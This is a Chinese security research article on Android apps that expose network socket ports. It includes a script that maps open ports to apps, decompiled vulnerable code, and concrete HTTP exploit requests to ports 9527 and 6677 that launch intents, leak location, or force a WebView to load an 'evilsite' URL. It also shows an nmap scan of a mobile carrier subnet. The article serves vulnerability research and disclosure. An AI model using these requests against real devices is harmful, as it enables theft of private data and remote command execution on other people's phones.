# 浅谈Android开放网络端口的安全风险

0x00 简介
=======

* * *

Android应用通常使用`PF_UNIX、PF_INET、PF_NETLINK`等不同domain的socket来进行本地IPC或者远程网络通信，这些暴露的socket代表了潜在的本地或远程攻击面，历史上也出现过不少利用socket进行拒绝服务、root提权或者远程命令执行的案例。特别是`PF_INET`类型的网络socket，可以通过网络与Android应用通信，其原本用于linux环境下开放网络服务，由于缺乏对网络调用者身份或者本地调用者pid、permission等细粒度的安全检查机制，在实现不当的情况下，可以突破Android的沙箱限制，以被攻击应用的权限执行命令，通常出现比较严重的漏洞。作为Android安全研究的新手，笔者带着传统服务器渗透寻找开放socket端口的思路，竟然也刷了不少漏洞，下面就对这种漏洞的发现、案例及影响进行归纳。

0x01 Android开放端口应用定位
====================

* * *

简单地利用命令netstat就可以发现Android开放了许多socket端口，如图。但这些开放端口本后的应用却不得而知。

![enter image description here](http://drops.javaweb.org/uploads/images/66c45b9f8968effaca23efb69516120407a325a2.jpg)

此时可以通过三步定位法进行寻找（感谢@瘦蛟舞的[帖子](http://zone.wooyun.org/content/20410)），支持非root手机。

第一步，利用netstat寻找感兴趣的开放socket端口，如图中的15555。

第二步，将端口转换为十六进制值，查看位于/proc/net/目录下对应的socket套接字状态文件，在其中找到使用该socket的应用的uid。如15555的十六进制表示为1cc3，协议类型为tcp6，那么查看/proc/net/tcp6文件。

![enter image description here](http://drops.javaweb.org/uploads/images/32aee85bf6af26f002e0e294a87ae18d5277c196.jpg)

注意上面的10115，就是使用该socket的应用的uid。通过这个uid可以得知应用的用户名为u0_a115。

第三步，根据用户名就可以找到应用了

![enter image description here](http://drops.javaweb.org/uploads/images/dd22591c5289804378612a66e652efcb421bc1a7.jpg)

至此，我们就知道开放15555端口的应用为com.qiyi.video，尽管我们还不能分辨出开放该端口的准确进程，但仍然为进一步的漏洞挖掘打下基础。

写一个简单的脚本来自动化的完成此项工作.

```
import subprocess,re 

def toHexPort(port):
    hexport = str(hex(int(port)))
    return hexport.strip('0x').upper()

def finduid(protocol, entry):
    if (protocol=='tcp' or protocol=='tcp6'):
        uid = entry.split()[-10]
    else: # udp or udp6
        uid = entry.split()[-6]
    uid = int(uid)
    if (uid > 10000): # just for non-system app
        return 'u0_a'+str(uid-10000) 
    else:
        return -1

def main():
    netstat_cmd = "adb shell netstat | grep -Ei 'listen|udp*'"
    #netstat_cmd = "adb shell netstat "
    grep_cmd = "adb shell grep" 
    proc_net = "/proc/net/"

# step 1, find interesting port
    orig_output = subprocess.check_output(netstat_cmd, shell=True)
    list_line = orig_output.split('\r\n')

    apps = []
    strip_listline = []
    pattern = re.compile("^Proto") # omit the first line

    for line in list_line:
        if (line != '') and (pattern.match(line)==None):

# step 2, find uid in /proc/net/[protocol] based on port 
            socket_entry = line.split()
            protocol = socket_entry[0]  
            port = socket_entry[3].split(':')[-1]
            grep_appid = grep_cmd+' '+ toHexPort(port)+' '+proc_net + protocol 
            net_entry = subprocess.check_output(grep_appid, shell=True)
            uid = finduid(protocol, net_entry)
# step 3, find app username based on uid
            if (uid == -1): continue
            applist = subprocess.check_output('adb shell ps | grep '+uid, shell=True).split()
            app = applist[8]
            apps.append(app)
            strip_listline.append(line)

    itapp= iter(apps)
    itline=iter(strip_listline)
# last, add app in orig_output of sockets
    print ("Package                  Proto Recv-Q Send-Q         Local Address          Foreign Address        State\r\n")
    try:
        while True:
            print itapp.next()+' '+itline.next()
    except StopIteration:
        pass

if __name__ == '__main__':
    main()

```

运行结果如下

![enter image description here](http://drops.javaweb.org/uploads/images/1720e45f53b67e43bbb2e813587c96066aadc6d4.jpg)

除了PF_INET套接字外，PF_UNIX、PF_NETLINK套接字的状态文件分别位于/proc/net/unix和/proc/net/netlink。

当然，如果手机已root，可直接使用busybox安装目录下带p参数的netstat命令，可以显示pid和不完整的program name。

![enter image description here](http://drops.javaweb.org/uploads/images/110178a3fa7e45da6bf149a74f87702196542154.jpg)

0x02 漏洞挖掘实例
===========

* * *

得知某个应用开放某个端口以后，接下就可以在该应用的逆向代码中搜索端口号（通常是端口号的16进制表示），重点关注ServerSocket(tcp)、DatagramSocket(udp)等类，定位到关键代码，进一步探索潜在的攻击面，下面列举一些漏洞实例。

1、敏感信息泄露、控制手机
-------------

[WooYun-2015-94537](http://www.wooyun.org/bugs/wooyun-2010-094537)：某service打开udp的65502端口监听，接收特定的命令字后可返回手机的敏感信息，包括手机助手远程管理手机的SecretKey，进而未授权的攻击者可通过网络完全管理手机。

[CVE-2014-8757](http://www.securityfocus.com/archive/1/534643), LG On-Screen Phone预装App认证绕过漏洞。

2、命令执行
------

这类漏洞比较常见，通常通过开放socket端口传入启动android应用组件的intent，然后以被攻击应用的权限执行启动activity、发送广播等操作。由于通过socket传入的intent，无法对发送者的身份和权限进行细粒度检查，绕过了Android提供的对应用组件的权限保护，能够启动未导出的和受权限保护的应用组件，对安全造成影响。

如果监听的端口是在本地，那么可能造成本地命令执行和权限提升，而如果监听的端口是任意地址，则可能造成比较严重的远程命令执行。

3、本地命令执行：
---------

用前面端口应用定位的方法，发现某流行应用实现了一个小型的HTTP Server，监听本地的9527端口，简单搜索分析即可发现向该端口发送如下形式的HTTP请求时可执行命令。

```
http://127.0.0.1:9527/si?cmp=<pacakgename>_<componentname>&data=<url scheme>&act=<action name>

```

通过这个简单的HTTP请求，恶意程序就可以传入intent对象的包名、组件名、url和action，接收HTTP请求后执行命令的代码如下：

```
...
        if(v3.hasNext()) {
            Object v6 = v3.next();
            if("act".equals(v6)) {
                v4.setAction(v10.b.get(v6));
            }
            if("cmp".equals(v6)) {
                String[] v9 = v10.b.get(v6).split("_");
                if(v9 == null) {
                    goto label_39;
                }
                if(v9.length != 2) {
                    goto label_39;
                }
                v4.setComponent(new ComponentName(v9[0], v9[1]));
            }

        label_39:

            if("data".equals(v6)) {
                v4.setData(Uri.parse(v10.b.get(v6)));
            }

            if(!"callback".equals(v6)) {
                goto label_13;
            }
            Object v1_1 = v10.b.get(v6);
            goto label_13;
        }

        if((TextUtils.isEmpty(v4.getAction())) && v4.getComponent() == null && v4.getData() == null) {

            if(TextUtils.isEmpty(((CharSequence)v1))) {
                return "{\"result\":-20000}";
            }
            return this.a(v1, "{\"result\":-20000}");
        }
        List v0 = this.a.getPackageManager().queryIntentActivities(v4, 0);
        if(v0.size() == 0) {
            if(TextUtils.isEmpty(((CharSequence)v1))) {
                return "{\"result\":-10000}";
            }
            return this.a(v1, "{\"result\":-10000}");
        }
        try {
            this.a.startActivity(v4);
        }
...

```

最终通过HTTP请求设置的Intent对象，传入了startActivity方法，由于需要用户干预，危害并不大。但当packagename指定为该应用自身，componentname指定为该应用的activity时，可以启动该应用的任意activity，包括受保护的未导出activity，从而对安全造成影响。例如，通过HTTP请求，逐一启动若干未导出的activity，可以发现拒绝服务漏洞、对安全有影响的登录界面和有一个可以该应用权限执行任意命令的GUI shell。

远程命令执行：

1.  趋势科技曾经发现过美团客户端漏洞，可以通过TCP的9527端口传入intent data，进而启动activity，见参考文献`[1]`.
    
2.  远程强制webview访问恶意链接
    

定位到某流行应用实现了一个小型的HTTP Server，在tcp的6677端口监听任意地址，当HTTP请求满足一定条件时可以返回敏感信息，并根据请求消息执行一系列动作。对于该HTTP请求，仅有的防御措施是通过referer白名单的方式判断HTTP请求的来源。在正确设置referer，发送如下HTTP GET请求后

```
http://ip:6677/command?param1=value1&...&paramn=valuen

```

可获取手机的敏感信息和实现命令执行。其中command为getpackageinfo、androidamap、geolocation中的其一，见如下代码片段。

![enter image description here](http://drops.javaweb.org/uploads/images/60442f43f84a1fa2d2a372b1c32ec1160351b669.jpg)

（1）当command为geolocation时，可返回安装该应用手机地理位置信息；

（2）当command为getpackageinfo时，默认返回该应用自身的版本信息。此时若指定参数param1为packagename,即请求http://ip:6677/getpackageinfo?packagename=xxx时（xxx为软件包名）可返回手机上安装的xxx所指定的任意软件包版本信息。若xxx为android，可返回android系统版本信息；

（3）当command为androidamap时，设置Intent并将其广播出去，查看对应的OnReceive方法

![enter image description here](http://drops.javaweb.org/uploads/images/480bef1548eac930c211639334ee13ac78ba2a31.jpg)

发现需要指定参数param1为action,即请求

```
http://ip:6677/androidamap?action=yyy&param2=value2&...&paramn=valuen

```

时，OnReceive方法取出前面广播intent对象的extra，新建一个intent对象，设置intent uri为

```
androidamap://yyy?sourceApplication=web&param2=value2&...&paramn=valuen

```

并以隐式intent的形式启动注册这种uri scheme的activiy。

进一步搜索发现如下代码：

```
Uri v0_2 = Uri.parse("androidamap://openFeature?featureName=OpenURL&sourceApplication=banner&urlType=0&contentType=autonavi&url="
                             + this.a.m.privilegeLink);
    Intent v1 = new Intent(MovieDetailHeaderView.c(this.a).getApplicationContext(), 
                            NewMapActivity.class);
    v1.setData(v0_2);
    v1.setFlags(268435456);
    MovieDetailHeaderView.c(this.a).startActivity(v1);

```

表明可以通过远程HTTP GET请求如下地址

```
http://ip:6677/androidamap?action=openFeature&featureName=OpenURL&sourceApplication=banner&urlType=0&contentType=autonavi&url=evilsite

```

操纵安装该app的手机继承WebView的Activity访问evilsite，而且这里存在WebView的漏洞，利用方式包括

(1). 窃取私有目录下的敏感文件：远程攻击者或者本地恶意app可以令WebView加载file://域的恶意脚本文件，按照恶意脚本的请求，窃取该应用私有目录下的敏感文件，突破android沙箱限制；

(2). WebView远程命令执行：存在可被网页中js操纵的接口jsinterface。由于该流行应用针对的SDK版本较低（`android:minSdkVersion="8"`），在Android 4.4.2以下的手机，均可使用该接口，通过js注入该应用进程执行命令。

0x03 漏洞利用场景
===========

* * *

对于Android app开放socket端口漏洞的远程利用场景，一般认为Android客户端都在内网，其利用主要还是在非安全的公共WiFi环境，通过对漏洞特征扫描即可利用。但在传统认为安全的移动互联网环境，笔者发现仍然可以扫描到其他开放端口的终端，因此也可以利用这种漏洞。

叙述之前，我们先对典型的移动通信网络架构进行简单的科普，一般教科书上的3G网络架构（WCDMA）如图。

![enter image description here](http://drops.javaweb.org/uploads/images/28888e3b0d5ab94e30e557f2a5d79315b9e9a441.jpg)

包括以下组成部分：

1.  UE: 用户终端设备，就是手机，为用户提供电路域和分组域内的各种业务功能。
    
2.  UTRAN: 陆地无线接入网，分为基站（Node B）和无线网络控制器（RNC）两部分。
    
3.  CN: 核心网络，负责与其他网络的连接和对UE 的通信和管理。主要功能实体包括：
    
    (1) MSC/VLR：提供CS(电路交换)域的呼叫控制、移动性管理、鉴权和加密等功能；
    
    (2) GMSC：网关移动交换中心，充当移动网和固定网之间的移动关口局，承担路由分析、网间接续、网间结算等重要功能；
    
    (3) SGSN：GPRS服务支持节点，提供PS（分组交换）域的路由转发、移动性管理、会话管理、鉴权和加密等功能；
    
    (4) GGSN：网关GPRS支持节点，提供数据包在WCDMA 移动网和外部数据网之间的路由和封装，GGSN就好象是可寻址WCDMA移动网络中所有用户IP 的路由器，需要同外部网络交换路由信息。
    
    (5) HLR：归属位置寄存器，提供用户的签约信息存放、新业务支持、增强的鉴权等功能。
    
4.  External Networks：外部网络，包括ISDN和PSTN等电路交换网络，以及Internet等分组交换网络。
    

简而言之，移动通信网络无非是大型的“局域网“，它们通过网关路由器（SGSN和GGSN）连上了Internet，进入到了互联网的世界。但是在某些移动通信网络的内部，不同的UE是可以互访的。以前面某应用开放6677端口为例，我们可以做一个简单的实验进行证明。

使用联通3G网络，查看当前IP地址。

![enter image description here](http://drops.javaweb.org/uploads/images/094ae0b5f400d75d8a93cf51067265456e2d3f9a.jpg)

在相邻C段进行扫描，扫描到开放端口的手机

```
nmap -sT --open -p6677 10.160.112.0/24

```

发现如下结果

![enter image description here](http://drops.javaweb.org/uploads/images/220fbb75f7afe7f9ed79d43bd4797f79b67d3ffc.jpg)

这证明在移动网络中，不同的UE可以互访。因此如果开放上述socket端口的app存在漏洞，在移动网络中也是可以利用的。

0x04 小结
=======

* * *

对于客户端的远程漏洞利用，从攻击者的角度来看，通常更容易使用“受”的方法，即通过欺骗、劫持或社工的方法来让客户端访问我的攻击载荷。然而，从笔者发现的漏洞案例来看，许多Android应用不正确地使用网络socket端口传入命令进行跨进程通信，而且对于本地应用环境，网络socket也先天缺乏细粒度的认证授权机制，因此把Android客户端当做服务器，使用“攻”的方法，主动向开放端口发送攻击载荷也是可行的。这种漏洞一旦存在，轻则本地提权，重则为远程利用的高危漏洞，3G移动网络允许UE互访更是加剧了这种风险。

此外，除PF_INET外，PF_UNIX、PF_NETLINK域的套接字也是值得关注的本地攻击面。

参考文献：`[1] http://blog.trendmicro.com/trendlabs-security-intelligence/open-socket-poses-risks-to-android-security-model`